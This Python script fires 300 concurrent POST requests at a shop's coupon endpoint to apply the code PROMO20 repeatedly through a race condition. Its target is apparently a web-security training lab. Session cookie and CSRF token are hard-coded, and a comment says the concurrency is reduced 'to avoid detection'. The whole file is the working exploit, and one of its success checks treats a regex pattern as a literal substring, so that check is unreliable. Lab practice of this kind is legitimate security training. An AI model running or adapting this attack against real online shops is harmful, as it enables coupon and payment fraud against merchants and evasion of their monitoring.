import asyncio
import aiohttp
import time

async def blast(session, url, headers, data, task_id):
    actual_successes = 0
    for i in range(30):
        start = time.time()
        try:
            async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=2)) as resp:
                body = await resp.text()
                end = time.time()
                
                # CRITICAL FIX: Check for actual discount application
                # Look for evidence in response body that coupon was applied
                if "Coupon applied" in body or "total.*[1-9]" in body or "discount" in body.lower():
                    actual_successes += 1
                    result = "REAL_SUCCESS"
                elif "already applied" in body:
                    result = "DUPLICATE"
                elif "Invalid coupon" in body:
                    result = "INVALID" 
                else:
                    # 200 response but no evidence of actual application
                    result = "FAKE_SUCCESS"
                
                print(f"[{task_id:02d}-{i:02d}] {result} | Δ:{(end-start):.3f}s | Real:{actual_successes}")
                
        except asyncio.TimeoutError:
            print(f"[{task_id:02d}-{i:02d}] TIMEOUT | Δ:{(time.time()-start):.3f}s")
        except Exception as e:
            print(f"[{task_id:02d}-{i:02d}] ERROR: {str(e)[:20]}...")

    return actual_successes

async def check_cart(session, cart_url, headers):
    """Check actual cart total after attack"""
    try:
        async with session.get(cart_url, headers=headers) as resp:
            body = await resp.text()
            # Parse cart total from response
            if "total" in body.lower():
                print(f"[CART] Current cart state retrieved")
                # You'll need to manually check the total
            return body
    except:
        return None

async def main():
    base_url = "https://0acb004103b9c15780113f4c002700e2.web-security-academy.net"
    coupon_url = f"{base_url}/cart/coupon"
    cart_url = f"{base_url}/cart"
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Cookie": "session=uR3lvHWc24dvFo7yEt8sK4yYDn6zQuMu"
    }
    data = "csrf=fRxBIVld9IEdpCmSIwejrlZYQxq6MRlW&coupon=PROMO20"
    
    print(f"[*] Starting PRECISE race attack at {time.ctime()}")
    print(f"[*] Only counting responses with actual discount evidence")
    print("-" * 60)
    
    async with aiohttp.ClientSession() as session:
        # Run attack
        tasks = [blast(session, coupon_url, headers, data, i) for i in range(10)]  # Reduced to avoid detection
        results = await asyncio.gather(*tasks)
        
        # Check cart state
        cart_body = await check_cart(session, cart_url, headers)
    
    total_real_successes = sum(results)
    print("-" * 60)
    print(f"[*] Attack completed at {time.ctime()}")
    print(f"[*] REAL SUCCESS responses: {total_real_successes}")
    
    if total_real_successes >= 5:
        print("[+] RACE CONDITION EXPLOITED SUCCESSFULLY")
        print("[+] Cart should be free or heavily discounted")
    else:
        print("[-] Limited real successes. Server may have server-side validation.")
        print("[*] Manual cart check required")

if __name__ == "__main__":
    asyncio.run(main())
